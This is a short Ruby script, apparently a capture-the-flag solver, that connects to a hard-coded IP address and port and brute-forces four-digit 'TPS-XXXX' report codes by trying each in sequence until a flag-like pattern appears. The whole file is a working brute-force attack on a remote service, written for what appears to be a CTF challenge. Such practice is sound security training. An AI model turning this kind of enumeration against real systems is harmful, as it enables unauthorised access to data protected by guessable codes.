# RTV TPS Report sucker
require 'socket'
require 'ipaddr'

tps_reports = (0..9999).to_a
i=0
while i < 9999
  #s = TCPSocket.new '164.90.147.2', 2345 
  s = TCPSocket.new '161.35.239.216', 5000
  while line = s.gets
    print line
    if /Generate TPS/.match(line)
      s.puts "1"
      next
    end
    if /TPS-XXXX/.match(line)
      puts "Guessing TPS-%04d" % tps_reports[i]
      s.puts "TPS-%04d" % tps_reports[i]
      i = i + 1
    end
    # first guess
    #abort if /ts{/.match(line)
    #
  end
  s.close
end
